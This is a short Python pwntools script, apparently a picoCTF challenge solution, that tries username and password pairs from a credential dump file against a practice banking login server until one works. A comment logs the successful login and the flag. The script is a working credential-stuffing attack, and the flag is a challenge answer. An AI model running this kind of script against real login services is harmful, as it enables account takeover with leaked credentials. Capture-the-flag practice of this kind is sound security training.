import time

from pwn import *

PROGRESS = "rennie"

creds = open("creds-dump.txt", "r").readlines()
for cred in creds:
    username, password = cred.strip().split(";")
    if PROGRESS is not None and username != PROGRESS:
        continue
    PROGRESS = None

    r = remote("crystal-peak.picoctf.net", 51653)
    print(f"Trying {username}:{password}")
    r.sendline(username)
    r.recvline()
    r.sendline(password)
    output = r.recvall().decode()
    print(output)
    if "Invalid" not in output:
        break
    r.close()

"""
The server seems a bit unstable so I had to retry the script manually, using a progress indicator to know where we left off.

Trying luis:papa
[+] Receiving all data: Done (285B)
[*] Closed connection to crystal-peak.picoctf.net port 51653

=========================================
Welcome to the Online Banking Service!
=========================================

Please enter your username & password to login.
Username: Password: papa

Authenticating...
Welcome luis!
picoCTF{d0nt_r3u5e_cr3d3nt1als_e7627560}
"""
